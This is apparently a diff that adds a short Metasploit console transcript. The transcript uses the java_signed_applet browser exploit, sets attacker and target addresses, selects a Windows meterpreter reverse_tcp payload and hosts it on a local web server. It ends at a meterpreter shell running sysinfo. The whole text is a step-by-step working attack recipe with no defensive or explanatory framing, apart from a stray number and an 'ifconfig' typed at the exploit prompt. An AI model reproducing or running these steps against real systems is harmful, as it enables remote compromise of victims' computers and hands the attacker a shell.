@@ -1,0 +1,15 @@
+root@kali:~#msfconsole
+msf> search java signed
+msf> use exploit/multi/browser/java_signed_applet
+msf exploit(java_signed_applet) > info
+74
+msf exploit(java_signed_applet) > show options
+msf exploit(java_signed_applet) >ifconfig
+msf exploit(java_signed_applet) > set RHOST 192.168.1.100
+msf exploit(java_signed_applet) > set target 1
+msf exploit(java_signed_applet) > set LHOST 192.168.1.110
+msf exploit(java_signed_applet) > set payload windows/meterpreter/reverse_tcp
+msf exploit(java_signed_applet) > set URIPATH /
+msf exploit(java_signed_applet) > exploit
+msf exploit(java_signed_applet) > [*] using URL: http://192.168.1.110:8000/
+meterpreter>sysinfo
